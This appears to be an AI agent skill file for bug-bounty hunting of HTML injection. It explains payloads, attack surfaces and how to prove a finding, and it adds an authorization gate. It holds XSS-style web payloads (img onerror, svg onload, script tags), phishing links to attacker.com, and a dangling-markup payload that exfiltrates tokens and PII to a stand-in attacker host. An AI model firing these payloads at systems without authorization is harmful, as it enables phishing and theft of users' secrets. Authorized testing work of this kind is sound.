---
name: hunt-html-injection
description: Hunt HTML Injection
category: security
risk: offensive
source: https://github.com/elementalsouls/Claude-BugHunter
source_repo: elementalsouls/Claude-BugHunter
source_type: community
date_added: '2026-09-20'
license: MIT
license_source: https://github.com/elementalsouls/Claude-BugHunter/blob/main/LICENSE
compatibility: Requires explicit written authorization for a target scope plus the
  relevant testing tools for this technique. Docs-only; helper scripts and commands
  not bundled.
sources: hackerone_public, public_research
report_count: 6
---
> **⚠️ AUTHORIZED USE ONLY**
> This skill is for educational purposes or authorized security assessments only.
> You must have explicit, written permission from the system owner before using this tool.
> Misuse of this tool is illegal and strictly prohibited.

> **Mandatory confirmation gate**
> Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
> 1. Ask the user to state the exact target URL, IP, account, or resource.
> 2. Ask the user to confirm written authorization and the permitted scope.
> 3. Show the exact command(s) and explain their expected effect.
> 4. Wait for explicit confirmation in the current conversation.
>
> Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.

## What is HTML Injection

HTML Injection occurs when user input is inserted into a page's HTML without escaping, so injected tags are rendered by the browser as markup rather than displayed as literal text. Unlike XSS, the injected content does not require JavaScript execution — injecting `<b>`, `<h1>`, `<a>`, `<img>`, or `<form>` tags is sufficient.

**To PROVE impact unambiguously, escalate to an active vector carrying a unique numeric canary** — e.g. `"><img src=x onerror=alert(91234)>` or `<svg onload=alert(91234)>`. A distinctive 4+ digit number (not `alert(1)`) distinguishes YOUR reflected injection from the example payloads practice pages embed in their own hint text. Proof = the raw, unescaped vector with your canary appears in the response.

**Impact:**
- Phishing via injected `<form>` or `<a href="attacker.com">` tags
- UI defacement — `<h1>HACKED</h1>` renders visually on the page
- Credential harvesting via injected login forms
- Redirect via `<meta http-equiv="refresh">`
- Stepping stone to XSS (may be blocked by WAF on `<script>` but not `<img onerror>`)
- **Dangling-markup exfiltration** — even with `<script>` and event handlers filtered, an *unterminated* tag can capture page content that follows it. Inject `<img src='//attacker.tld/log?html=` (no closing quote/`>`); the browser treats everything up to the next `'` as the URL, leaking any CSRF token, secret, or PII rendered after your injection point to your server. Works where full XSS is blocked but raw `<` is reflected.
- **Email/notification-context injection** — a field reflected unescaped into a transactional email (signup confirmation, admin alert, support-chat transcript) renders injected `<a>`/`<img>`/dangling markup in the *recipient's* inbox — an audience the web UI can't reach, and often the only place HTML is rendered unfiltered. Inject into name/subject/comment, then read the raw email source. Disclosed class: <https://hackerone.com/reports/1935628>, <https://hackerone.com/reports/3556892>.

## Attack Surface

Any input that is reflected or stored and then displayed in an HTML context:
- Search boxes (`?q=`)
- Comments, feedback, reviews
- Profile fields (name, bio, username)
- Error messages (`?error=`, `?message=`)
- Subject / body of contact forms
- Admin-visible fields (ticket titles, usernames in logs)

## Autonomous Testing Priority

**Inject a recognisable HTML tag with a unique canary string. Unescaped angle brackets in the response = confirmed injection.**

**Pattern 1 — Basic HTML tag injection:**
```
<b>CANARY</b>
"><b>CANARY</b>
```
Use a unique string as CANARY (something distinct to this test run). **Proof:** the response contains `<b>CANARY` with literal `<` angle brackets — not `&lt;b&gt;CANARY`. A properly encoded app would escape `<` to `&lt;`.

**Try multiple tag types when `<b>` is filtered:**
- `<h1>CANARY</h1>` — heading tag (often less filtered)
- `<img src=x onerror=CANARY>` — attribute context
- `<a href="https://attacker.com">click</a>` — link injection (phishing proof)

**For stored injection:** inject into the storage endpoint, then GET the page where the value is displayed and check for unescaped tags.

**Escalate immediately:** if `<b>` injection works, try `<script>alert(1)</script>` — the same unsanitised input may allow full XSS.

## Proof

Confirmed when your injected tag appears in the response body with literal `<` angle brackets (not HTML-encoded). A safe app renders `&lt;b&gt;CANARY&lt;/b&gt;`; a vulnerable app renders `<b>CANARY</b>`.

## Distinguishing HTML Injection from XSS

- HTML injection: `<b>text</b>` renders as **text** in the browser — no JS execution needed.
- XSS: `<script>alert(1)</script>` executes JavaScript.

Some WAFs block `<script>` but pass `<b>` or `<img>` — start with non-script tags, then escalate.

## When to Use

- You have explicit, written authorization to assess the target in scope, and the task matches this skill's vulnerability class or technique within a bug-bounty or penetration-test engagement.
- You need the recon, exploitation, or validation workflow described below — executed strictly inside the approved scope.

## Limitations

- Authorized scope only: the confirmation gate above is mandatory before any probing, exploitation, or credential-access command.
- Docs-only import: upstream helper scripts, commands, engine, and research assets are not bundled; reinstall tooling from the source repo when needed.
- Validate every finding (see `triage-validation`) before reporting; report via `report-writing`. Prefer a sandbox, disposable VM, or controlled lab.

### Example

```bash
# Read-only first step; confirm scope before anything active.
cat scope.txt  # target list from the authorized engagement brief
```

> Adapted from [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter) (MIT); frontmatter, When to Use/Limitations, and safety boundaries added for upstream compliance. Docs-only import: executable helpers, commands, engine, and research assets not bundled.
